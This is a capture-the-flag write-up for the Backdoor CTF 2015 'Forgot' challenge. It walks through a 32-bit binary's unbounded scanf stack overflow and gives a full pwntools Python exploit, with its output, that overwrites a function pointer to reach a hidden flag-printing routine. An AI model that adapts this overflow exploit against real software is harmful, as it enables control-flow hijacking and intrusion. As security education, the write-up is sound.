# Backdoor CTF 2015: Forgot

**Category:** Pwnable
**Points:** 200
**Description:** 

> Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.
> 
> Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed [here](challenge/forgot-724a09c084a9df46d8555bf77612e612.tar.gz).

## Write-up

Let's first take a look at the binary:

>```bash
> file forgot 
> forgot: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x2d0a93353682049b11964e699e753b07c4b8881c, stripped
>```

See what checksec has to say:

>```bash
> gdb-peda$ checksec
> CANARY    : disabled
> FORTIFY   : disabled
> NX        : ENABLED
> PIE       : disabled
> RELRO     : Partial
>```

A 32-bit ELF with non-exec stack and not much else. Instead of toying around with the service, let's just decompile the binary and cut to the chase (function names added for clarity):

>```c
>int mainroutine()
>{
>  int v0; // eax@3
>  int v1; // eax@9
>  int v2; // eax@15
>  int v3; // eax@18
>  int v4; // eax@21
>  int v5; // eax@24
>  size_t v6; // ebx@29
>  int v8; // [sp+10h] [bp-74h]@1
>  int (*v9)(); // [sp+30h] [bp-54h]@1
>  int (*v10)(); // [sp+34h] [bp-50h]@1
>  int (*v11)(); // [sp+38h] [bp-4Ch]@1
>  int (*v12)(); // [sp+3Ch] [bp-48h]@1
>  int (*v13)(); // [sp+40h] [bp-44h]@1
>  int (*v14)(); // [sp+44h] [bp-40h]@1
>  int (*v15)(); // [sp+48h] [bp-3Ch]@1
>  int (*v16)(); // [sp+4Ch] [bp-38h]@1
>  int (*v17)(); // [sp+50h] [bp-34h]@1
>  int (*v18)(); // [sp+54h] [bp-30h]@1
>  int v19; // [sp+58h] [bp-2Ch]@1
>  signed int v20; // [sp+78h] [bp-Ch]@1
>  size_t i; // [sp+7Ch] [bp-8h]@1
>
>  v20 = 1;
>  v9 = fancy_at_dot;
>  v10 = not_even_at;
>  v11 = hungry_at;
>  v12 = localhost_dot;
>  v13 = end_with_dot;
>  v14 = single_tld;
>  v15 = valid_hai1;
>  v16 = valid_hai2;
>  v17 = valid_hai3;
>  v18 = just_made_it;
>  puts("What is your name?");
>  printf("> ");
>  fflush(stdout);
>  fgets((char *)&v19, 32, stdin);
>  say_hello((int)&v19);
>  fflush(stdout);
>  printf("I should give you a pointer perhaps. Here: %x\n\n", end_with_dot);
>  fflush(stdout);
>  puts("Enter the string to be validate");
>  printf("> ");
>  fflush(stdout);
>  __isoc99_scanf("%s", &v8);
>  for ( i = 0; ; ++i )
>  {
>    v6 = i;
>    if ( v6 >= strlen((const char *)&v8) )
>      break;
>    switch ( v20 )
>    {
>      case 1:
>        LOBYTE(v0) = sub_8048702(*((_BYTE *)&v8 + i));
>        if ( v0 )
>          v20 = 2;
>        break;
>      case 2:
>        if ( *((_BYTE *)&v8 + i) == 64 )
>          v20 = 3;
>        break;
>      case 3:
>        LOBYTE(v1) = sub_804874C(*((_BYTE *)&v8 + i));
>        if ( v1 )
>          v20 = 4;
>        break;
>      case 4:
>        if ( *((_BYTE *)&v8 + i) == 46 )
>          v20 = 5;
>        break;
>      case 5:
>        LOBYTE(v2) = sub_8048784(*((_BYTE *)&v8 + i));
>        if ( v2 )
>          v20 = 6;
>        break;
>      case 6:
>        LOBYTE(v3) = sub_8048784(*((_BYTE *)&v8 + i));
>        if ( v3 )
>          v20 = 7;
>        break;
>      case 7:
>        LOBYTE(v4) = sub_8048784(*((_BYTE *)&v8 + i));
>        if ( v4 )
>          v20 = 8;
>        break;
>      case 8:
>        LOBYTE(v5) = sub_8048784(*((_BYTE *)&v8 + i));
>        if ( v5 )
>          v20 = 9;
>        break;
>      case 9:
>        v20 = 10;
>        break;
>      default:
>        continue;
>    }
>  }
>  --v20;
>  (*(&v9 + v20))();
>  return fflush(stdout);
>}
>```

The binary is a simple FSA-style e-mail address validator. Depending on how you violate the e-mail address format it displays a different message (for which it uses different functions). Instead of focussing on the application functionality and the states it could or could not reach, we can spot a buffer overflow:

>```c
>  __isoc99_scanf("%s", &v8);
>```

Given that scanf is called without a length specifier we can write an arbitrary amount of data to the stack variable v8. Instead of trying to overwrite EIP we see that we can overflow v8 into v9 which is used as a function pointer later on:

>```c
>  int v8; // [sp+10h] [bp-74h]@1
>  int (*v9)(); // [sp+30h] [bp-54h]@1
>(...)
>  (*(&v9 + v20))();
>```

We don't have to pop a shell because we can overwrite v9 with the address of another interesting function. None of the FSA state functions are interesting except for the following:

>```c
>int just_made_it()
>{
>  return puts("You just made it. But then you didn't!");
>}
>```

The decompiler doesn't make it look interesting but when disassembling it we can see the following:

>```asm
>.text:080486B8 just_made_it    proc near               ; DATA XREF: mainroutine+5Ao
>.text:080486B8                 push    ebp
>.text:080486B9                 mov     ebp, esp
>.text:080486BB                 sub     esp, 18h
>.text:080486BE                 mov     dword ptr [esp], offset aYouJustMadeIt_ ; "You just made it. But then you didn't!"
>.text:080486C5                 call    _puts
>.text:080486CA                 leave
>.text:080486CB                 retn
>.text:080486CB just_made_it    endp
>.text:080486CB
>.text:080486CC ; ---------------------------------------------------------------------------
>.text:080486CC                 push    ebp
>.text:080486CD                 mov     ebp, esp
>.text:080486CF                 sub     esp, 58h
>.text:080486D2                 mov     dword ptr [esp+0Ch], offset a_Flag ; "./flag"
>.text:080486DA                 mov     dword ptr [esp+8], offset aCatS ; "cat %s"
>.text:080486E2                 mov     dword ptr [esp+4], 32h
>.text:080486EA                 lea     eax, [ebp-3Ah]
>.text:080486ED                 mov     [esp], eax
>.text:080486F0                 call    _snprintf
>.text:080486F5                 lea     eax, [ebp-3Ah]
>.text:080486F8                 mov     [esp], eax
>.text:080486FB                 call    _system
>.text:08048700                 leave
>.text:08048701                 retn
>```

The function just_made_it is followed by a 'hidden' function that reads the flag file and displays it to us. So all we have to do now is overflow v8 to overwrite v9 with the address of our 'hidden' function. The application is kind enough to give us a pointer to a function in the binary (even though this isn't strictly necessary):

>```c
>  printf("I should give you a pointer perhaps. Here: %x\n\n", end_with_dot);
>```

So we can calculate the address of our function as an offset from the supplied address. The v8 buffer is 32 bytes long so we simply write 32 bytes of junk followed by the calculated address of the 'hidden' function:

>```python
>#!/usr/bin/python
>#
># Backdoor CTF 2015
># FORGOT (PWN/200)
>#
># @a: Smoke Leet Everyday
># @u: https://github.com/smokeleeteveryday
>#
>
>from pwn import *
>from struct import pack, unpack
>import re
>
>offset = 0x78 # offset from end_with_dot to 0x080486CC
>
>host = 'hack.bckdr.in'
>h = remote(host, 8009, timeout = None)
>print h.recvuntil('> ')
>
>name = "420"
>h.send(name + "\n")
>
>msg = h.recvuntil('> ')
>print msg
>
># Get end_with_dot address
>m = re.findall("Here:\s(.*?)$", msg, re.MULTILINE)
>
># Calculate target address
>end_with_dot_Addr = int(m[0], 16)
>targetAddr = end_with_dot_Addr + offset
>
># Send exploit buffer
>valstr = "A" * 32 + pack('<I', targetAddr)
>h.send(valstr + "\n")
>
>print h.recvall()
>h.close()
>```

Which produces the following output:

>```bash
>$ python forgotsploit.py 
>[+] Opening connection to hack.bckdr.in on port 8009: Done
>What is your name?
>> 
>
>Hi 420
>
>
>            Finite-State Automaton
>
>I have implemented a robust FSA to validate email addresses
>Throw a string at me and I will let you know if it is a valid email address
>
>                Cheers!
>
>I should give you a pointer perhaps. Here: 8048654
>
>Enter the string to be validate
>> 
>[+] Recieving all data: Done (65B)
>[*] Closed connection to hack.bckdr.in port 8009
>{flag removed upon request of backdoorCTF admins ;)}
>```
